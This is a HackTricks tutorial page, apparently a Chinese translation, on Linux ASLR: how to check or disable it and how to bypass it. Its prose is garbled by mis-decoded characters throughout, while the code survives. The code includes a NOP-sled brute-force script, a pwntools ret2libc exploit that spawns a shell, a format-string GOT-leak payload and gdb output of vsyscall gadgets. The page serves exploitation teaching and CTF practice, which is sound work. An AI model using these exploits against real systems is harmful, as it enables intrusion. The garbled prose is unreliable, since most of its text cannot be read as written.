# ASLR

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

**åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼ˆASLRï¼‰**æ˜¯æ“ä½œç³»ç»Ÿä¸­ä½¿ç”¨çš„ä¸€ç§å®‰å…¨æŠ€æœ¯ï¼Œç”¨äº**éšæœºåŒ–ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºè¿›ç¨‹ä½¿ç”¨çš„å†…å­˜åœ°å€**ã€‚é€šè¿‡è¿™æ ·åšï¼Œå®ƒæ˜¾è‘—å¢åŠ äº†æ”»å‡»è€…é¢„æµ‹ç‰¹å®šè¿›ç¨‹å’Œæ•°æ®ä½ç½®ï¼ˆå¦‚å †æ ˆã€å †å’Œåº“ï¼‰çš„éš¾åº¦ï¼Œä»è€Œå‡è½»äº†æŸäº›ç±»å‹çš„åˆ©ç”¨ï¼Œç‰¹åˆ«æ˜¯ç¼“å†²åŒºæº¢å‡ºã€‚

### **æ£€æŸ¥ASLRçŠ¶æ€**

è¦åœ¨Linuxç³»ç»Ÿä¸Š**æ£€æŸ¥**ASLRçŠ¶æ€ï¼Œæ‚¨å¯ä»¥ä»**`/proc/sys/kernel/randomize_va_space`**æ–‡ä»¶ä¸­è¯»å–å€¼ã€‚å­˜å‚¨åœ¨æ­¤æ–‡ä»¶ä¸­çš„å€¼ç¡®å®šåº”ç”¨çš„ASLRç±»å‹ï¼š

* **0**ï¼šæ— éšæœºåŒ–ã€‚ä¸€åˆ‡éƒ½æ˜¯é™æ€çš„ã€‚
* **1**ï¼šä¿å®ˆéšæœºåŒ–ã€‚å…±äº«åº“ã€å †æ ˆã€mmap()ã€VDSOé¡µè¢«éšæœºåŒ–ã€‚
* **2**ï¼šå®Œå…¨éšæœºåŒ–ã€‚é™¤äº†ä¿å®ˆéšæœºåŒ–éšæœºåŒ–çš„å…ƒç´ å¤–ï¼Œé€šè¿‡`brk()`ç®¡ç†çš„å†…å­˜ä¹Ÿè¢«éšæœºåŒ–ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥ASLRçŠ¶æ€ï¼š
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **ç¦ç”¨ ASLR**

è¦**ç¦ç”¨** ASLRï¼Œæ‚¨éœ€è¦å°† `/proc/sys/kernel/randomize_va_space` çš„å€¼è®¾ç½®ä¸º **0**ã€‚é€šå¸¸ä¸å»ºè®®åœ¨æµ‹è¯•æˆ–è°ƒè¯•åœºæ™¯ä¹‹å¤–ç¦ç”¨ ASLRã€‚ä»¥ä¸‹æ˜¯ç¦ç”¨æ–¹æ³•ï¼š
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
æ‚¨è¿˜å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç¦ç”¨æ‰§è¡Œçš„ASLRï¼š
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **å¯ç”¨ASLR**

è¦**å¯ç”¨**ASLRï¼Œæ‚¨å¯ä»¥å°†å€¼**2**å†™å…¥`/proc/sys/kernel/randomize_va_space`æ–‡ä»¶ã€‚é€šå¸¸éœ€è¦rootæƒé™ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ç”¨å®Œå…¨éšæœºåŒ–ï¼š
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **è·¨é‡å¯ä¿æŒ**

ä½¿ç”¨`echo`å‘½ä»¤è¿›è¡Œçš„æ›´æ”¹æ˜¯ä¸´æ—¶çš„ï¼Œåœ¨é‡å¯åå°†è¢«é‡ç½®ã€‚è¦ä½¿æ›´æ”¹æŒä¹…åŒ–ï¼Œæ‚¨éœ€è¦ç¼–è¾‘`/etc/sysctl.conf`æ–‡ä»¶å¹¶æ·»åŠ æˆ–ä¿®æ”¹ä»¥ä¸‹è¡Œï¼š
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
ç¼–è¾‘`/etc/sysctl.conf`åï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åº”ç”¨æ›´æ”¹ï¼š
```bash
sudo sysctl -p
```
è¿™å°†ç¡®ä¿æ‚¨çš„ASLRè®¾ç½®åœ¨é‡æ–°å¯åŠ¨åä¿æŒä¸å˜ã€‚

## **ç»•è¿‡**

### 32ä½æš´åŠ›ç ´è§£

PaXå°†è¿›ç¨‹åœ°å€ç©ºé—´åˆ†ä¸º**3ç»„**ï¼š

* **ä»£ç å’Œæ•°æ®**ï¼ˆå·²åˆå§‹åŒ–å’Œæœªåˆå§‹åŒ–ï¼‰ï¼š`.text`ã€`.data`å’Œ`.bss` â€”> `delta_exec`å˜é‡ä¸­çš„**16ä½**ç†µã€‚è¯¥å˜é‡åœ¨æ¯ä¸ªè¿›ç¨‹ä¸­éšæœºåˆå§‹åŒ–ï¼Œå¹¶æ·»åŠ åˆ°åˆå§‹åœ°å€ä¸­ã€‚
* ç”±`mmap()`åˆ†é…çš„**å†…å­˜**å’Œ**å…±äº«åº“** â€”> **16ä½**ï¼Œåä¸º`delta_mmap`ã€‚
* **å †æ ˆ** â€”> **24ä½**ï¼Œç§°ä¸º`delta_stack`ã€‚ä½†å®é™…ä¸Šåªä½¿ç”¨**11ä½**ï¼ˆä»ç¬¬10åˆ°ç¬¬20å­—èŠ‚ï¼ŒåŒ…æ‹¬åœ¨å†…ï¼‰ï¼Œå¯¹é½åˆ°**16å­—èŠ‚** â€”> è¿™å¯¼è‡´**524,288ä¸ªå¯èƒ½çš„çœŸå®å †æ ˆåœ°å€**ã€‚

ä¸Šè¿°æ•°æ®é€‚ç”¨äº32ä½ç³»ç»Ÿï¼Œé™ä½çš„æœ€ç»ˆç†µä½¿å¾—å¯ä»¥é€šè¿‡å¤šæ¬¡å°è¯•æ‰§è¡Œç›´åˆ°æˆåŠŸå®Œæˆåˆ©ç”¨æ¥ç»•è¿‡ASLRã€‚

#### æš´åŠ›ç ´è§£æ€è·¯ï¼š

* å¦‚æœæ‚¨æœ‰è¶³å¤Ÿå¤§çš„æº¢å‡ºç©ºé—´æ¥å®¹çº³**å¤§å‹NOPæ»‘æ¢¯**ï¼Œæ‚¨å¯ä»¥åœ¨å †æ ˆä¸­æš´åŠ›ç ´è§£åœ°å€ï¼Œç›´åˆ°æµç¨‹**è·³è¿‡NOPæ»‘æ¢¯çš„æŸä¸ªéƒ¨åˆ†**ã€‚
* å¦ä¸€ç§é€‰æ‹©æ˜¯ï¼Œå¦‚æœæº¢å‡ºç©ºé—´ä¸å¤Ÿå¤§ä¸”åˆ©ç”¨å¯ä»¥åœ¨æœ¬åœ°è¿è¡Œï¼Œåˆ™å¯ä»¥**å°†NOPæ»‘æ¢¯å’Œshellcodeæ·»åŠ åˆ°ç¯å¢ƒå˜é‡**ä¸­ã€‚
* å¦‚æœåˆ©ç”¨æ˜¯æœ¬åœ°çš„ï¼Œæ‚¨å¯ä»¥å°è¯•æš´åŠ›ç ´è§£libcçš„åŸºåœ°å€ï¼ˆé€‚ç”¨äº32ä½ç³»ç»Ÿï¼‰ï¼š
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* å¦‚æœæ”»å‡»è¿œç¨‹æœåŠ¡å™¨ï¼Œæ‚¨å¯ä»¥å°è¯•**æš´åŠ›ç ´è§£`libc`å‡½æ•°`usleep`çš„åœ°å€**ï¼Œå°†10ä½œä¸ºå‚æ•°ä¼ é€’ã€‚å¦‚æœæŸä¸ªæ—¶åˆ»**æœåŠ¡å™¨éœ€è¦é¢å¤–10ç§’æ‰èƒ½å“åº”**ï¼Œåˆ™æ‰¾åˆ°äº†è¯¥å‡½æ•°çš„åœ°å€ã€‚

{% hint style="success" %}
åœ¨64ä½ç³»ç»Ÿä¸­ï¼Œç†µè¦é«˜å¾—å¤šï¼Œè¿™æ˜¯ä¸å¯èƒ½çš„ã€‚
{% endhint %}

### 64ä½å †æ ˆæš´åŠ›ç ´è§£

å¯ä»¥ä½¿ç”¨ç¯å¢ƒå˜é‡å ç”¨å †æ ˆçš„å¤§éƒ¨åˆ†ç©ºé—´ï¼Œç„¶åå°è¯•åœ¨æœ¬åœ°æ»¥ç”¨äºŒè¿›åˆ¶æ–‡ä»¶æ•°ç™¾/æ•°åƒæ¬¡ä»¥åˆ©ç”¨å®ƒã€‚\
ä»¥ä¸‹ä»£ç æ˜¾ç¤ºäº†å¦‚ä½•**ä»…é€‰æ‹©å †æ ˆä¸­çš„ä¸€ä¸ªåœ°å€**ï¼Œå¹¶ä¸”æ¯**å‡ ç™¾æ¬¡æ‰§è¡Œ**ï¼Œè¯¥åœ°å€å°†åŒ…å«**NOPæŒ‡ä»¤**ï¼š
```c
//clang -o aslr-testing aslr-testing.c -fno-stack-protector -Wno-format-security -no-pie
#include <stdio.h>

int main() {
unsigned long long address = 0xffffff1e7e38;
unsigned int* ptr = (unsigned int*)address;
unsigned int value = *ptr;
printf("The 4 bytes from address 0xffffff1e7e38: 0x%x\n", value);
return 0;
}
```

```python
import subprocess
import traceback

# Start the process
nop = b"\xD5\x1F\x20\x03" # ARM64 NOP transposed
n_nops = int(128000/4)
shellcode_env_var = nop * n_nops

# Define the environment variables you want to set
env_vars = {
'a': shellcode_env_var,
'b': shellcode_env_var,
'c': shellcode_env_var,
'd': shellcode_env_var,
'e': shellcode_env_var,
'f': shellcode_env_var,
'g': shellcode_env_var,
'h': shellcode_env_var,
'i': shellcode_env_var,
'j': shellcode_env_var,
'k': shellcode_env_var,
'l': shellcode_env_var,
'm': shellcode_env_var,
'n': shellcode_env_var,
'o': shellcode_env_var,
'p': shellcode_env_var,
}

cont = 0
while True:
cont += 1

if cont % 10000 == 0:
break

print(cont, end="\r")
# Define the path to your binary
binary_path = './aslr-testing'

try:
process = subprocess.Popen(binary_path, env=env_vars, stdout=subprocess.PIPE, text=True)
output = process.communicate()[0]
if "0xd5" in str(output):
print(str(cont) + " -> " + output)
except Exception as e:
print(e)
print(traceback.format_exc())
pass
```
<figure><img src="../../../.gitbook/assets/image (1211).png" alt="" width="563"><figcaption></figcaption></figure>

### æœ¬åœ°ä¿¡æ¯ (`/proc/[pid]/stat`)

è¿›ç¨‹çš„æ–‡ä»¶ **`/proc/[pid]/stat`** æ€»æ˜¯å¯ä»¥è¢«æ‰€æœ‰äººè¯»å–ï¼Œå…¶ä¸­åŒ…å«ä¸€äº›æœ‰è¶£çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š

- **startcode** å’Œ **endcode**ï¼šäºŒè¿›åˆ¶æ–‡ä»¶çš„ **TEXT** ä¸Šæ–¹å’Œä¸‹æ–¹çš„åœ°å€
- **startstack**ï¼š**æ ˆ** èµ·å§‹åœ°å€
- **start\_data** å’Œ **end\_data**ï¼š**BSS** æ‰€åœ¨çš„ä¸Šæ–¹å’Œä¸‹æ–¹çš„åœ°å€
- **kstkesp** å’Œ **kstkeip**ï¼šå½“å‰ **ESP** å’Œ **EIP** åœ°å€
- **arg\_start** å’Œ **arg\_end**ï¼š**å‘½ä»¤è¡Œå‚æ•°** æ‰€åœ¨çš„ä¸Šæ–¹å’Œä¸‹æ–¹çš„åœ°å€
- **env\_start** å’Œ **env\_end**ï¼š**ç¯å¢ƒå˜é‡** æ‰€åœ¨çš„ä¸Šæ–¹å’Œä¸‹æ–¹çš„åœ°å€

å› æ­¤ï¼Œå¦‚æœæ”»å‡»è€…ä¸è¢«åˆ©ç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶åœ¨åŒä¸€å°è®¡ç®—æœºä¸Šï¼Œå¹¶ä¸”è¯¥äºŒè¿›åˆ¶æ–‡ä»¶ä¸æœŸæœ›ä»åŸå§‹å‚æ•°ä¸­æº¢å‡ºï¼Œè€Œæ˜¯ä»ä¸€ä¸ªä¸åŒçš„ **å¯ä»¥åœ¨è¯»å–æ­¤æ–‡ä»¶åæ„é€ çš„è¾“å…¥** ä¸­æº¢å‡ºï¼Œæ”»å‡»è€…å¯ä»¥ **ä»æ­¤æ–‡ä»¶ä¸­è·å–ä¸€äº›åœ°å€å¹¶ä¸ºåˆ©ç”¨æ„é€ åç§»é‡**ã€‚

{% hint style="success" %}
æœ‰å…³æ­¤æ–‡ä»¶çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html) æœç´¢ `/proc/pid/stat`
{% endhint %}

### æ‹¥æœ‰ä¸€ä¸ªæ³„æ¼

- **æŒ‘æˆ˜æ˜¯æä¾›ä¸€ä¸ªæ³„æ¼**

å¦‚æœæ‚¨è·å¾—äº†ä¸€ä¸ªæ³„æ¼ï¼ˆç®€å•çš„CTFæŒ‘æˆ˜ï¼‰ï¼Œæ‚¨å¯ä»¥ä»ä¸­è®¡ç®—åç§»é‡ï¼ˆå‡è®¾æ‚¨çŸ¥é“æ­£åœ¨åˆ©ç”¨çš„ç³»ç»Ÿä¸­ä½¿ç”¨çš„ç¡®åˆ‡libcç‰ˆæœ¬ï¼‰ã€‚æ­¤ç¤ºä¾‹åˆ©ç”¨æ˜¯ä» [**æ­¤å¤„çš„ç¤ºä¾‹**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) ä¸­æå–çš„ï¼ˆè¯·æŸ¥çœ‹è¯¥é¡µé¢ä»¥è·å–æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼‰ï¼š
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºå¯ä»¥åˆ©ç”¨ **ret2plt** æ¥çªƒå–æ¥è‡ª libc çš„å‡½æ•°åœ°å€ã€‚æŸ¥çœ‹ï¼š

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„è¯»å–**

å°±åƒåœ¨ ret2plt ä¸­ä¸€æ ·ï¼Œå¦‚æœé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å…·æœ‰ä»»æ„è¯»å–æƒé™ï¼Œåˆ™å¯ä»¥ä» GOT ä¸­çªƒå– **libc å‡½æ•°** çš„åœ°å€ã€‚ä»¥ä¸‹[**ç¤ºä¾‹æ¥è‡ªæ­¤å¤„**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®æ‰¾åˆ°æœ‰å…³æ ¼å¼å­—ç¬¦ä¸²ä»»æ„è¯»å–çš„æ›´å¤šä¿¡æ¯ï¼š

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

å°è¯•é€šè¿‡æ»¥ç”¨å †æ ˆå†…éƒ¨çš„åœ°å€æ¥ç»•è¿‡ASLRï¼š

{% content-ref url="ret2ret.md" %}
[ret2ret.md](ret2ret.md)
{% endcontent-ref %}

### vsyscall

**`vsyscall`** æœºåˆ¶æ—¨åœ¨é€šè¿‡å…è®¸åœ¨ç”¨æˆ·ç©ºé—´æ‰§è¡ŒæŸäº›ç³»ç»Ÿè°ƒç”¨æ¥æé«˜æ€§èƒ½ï¼Œå°½ç®¡å®ƒä»¬ä»æ ¹æœ¬ä¸Šå±äºå†…æ ¸ã€‚ **vsyscalls** çš„å…³é”®ä¼˜åŠ¿åœ¨äºå®ƒä»¬çš„**å›ºå®šåœ°å€**ï¼Œä¸å—**ASLR**ï¼ˆåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼‰çš„å½±å“ã€‚è¿™ç§å›ºå®šæ€§æ„å‘³ç€æ”»å‡»è€…æ— éœ€ä¿¡æ¯æ³„æ¼æ¼æ´å³å¯ç¡®å®šå…¶åœ°å€å¹¶åœ¨åˆ©ç”¨ä¸­ä½¿ç”¨å®ƒä»¬ã€‚\
ç„¶è€Œï¼Œåœ¨è¿™é‡Œä¸ä¼šæ‰¾åˆ°éå¸¸æœ‰è¶£çš„å°å·¥å…·ï¼ˆå°½ç®¡ä¾‹å¦‚å¯èƒ½è·å¾—ä¸€ä¸ª `ret;` ç­‰æ•ˆçš„ä¸œè¥¿ï¼‰

ï¼ˆä»¥ä¸‹ç¤ºä¾‹å’Œä»£ç æ¥è‡ª[**æ­¤æ–‡æ¡£**](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html#exploitation)ï¼‰

ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯èƒ½åœ¨åˆ©ç”¨ä¸­ä½¿ç”¨åœ°å€ `0xffffffffff600800`ã€‚å°è¯•ç›´æ¥è·³è½¬åˆ° `ret` æŒ‡ä»¤å¯èƒ½ä¼šå¯¼è‡´åœ¨æ‰§è¡Œå‡ ä¸ªå°å·¥å…·åä¸ç¨³å®šæˆ–å´©æºƒï¼Œè€Œè·³è½¬åˆ°ç”±**vsyscall**éƒ¨åˆ†æä¾›çš„ `syscall` çš„å¼€å¤´å¯èƒ½ä¼šæˆåŠŸã€‚é€šè¿‡è°¨æ…åœ°æ”¾ç½®ä¸€ä¸ªå°†æ‰§è¡Œå¼•å¯¼åˆ°è¿™ä¸ª**vsyscall**åœ°å€çš„**ROP**å°å·¥å…·ï¼Œæ”»å‡»è€…å¯ä»¥å®ç°ä»£ç æ‰§è¡Œï¼Œè€Œæ— éœ€ä¸ºåˆ©ç”¨çš„è¿™éƒ¨åˆ†ç»•è¿‡**ASLR**ã€‚
```
efâ¤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]
0x00007ffff7dcc000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df1000 0x00007ffff7f64000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f64000 0x00007ffff7fad000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb0000 0x00007ffff7fb3000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb3000 0x00007ffff7fb9000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefâ¤  x.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
A syntax error in expression, near `.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]'.
gefâ¤  x/8g 0xffffffffff600000
0xffffffffff600000:    0xf00000060c0c748    0xccccccccccccc305
0xffffffffff600010:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600020:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600030:    0xcccccccccccccccc    0xcccccccccccccccc
gefâ¤  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
gefâ¤  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
```
### vDSO

å› æ­¤è¯·æ³¨æ„ï¼Œå¦‚æœå†…æ ¸ç¼–è¯‘æ—¶ä½¿ç”¨äº†CONFIG\_COMPAT\_VDSOï¼Œå¯èƒ½ä¼šé€šè¿‡æ»¥ç”¨vdsoæ¥**ç»•è¿‡ASLR**ï¼Œå› ä¸ºvdsoåœ°å€ä¸ä¼šè¢«éšæœºåŒ–ã€‚æ¬²äº†è§£æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../../rop-return-oriented-programing/ret2vdso.md" %}
[ret2vdso.md](../../rop-return-oriented-programing/ret2vdso.md)
{% endcontent-ref %}
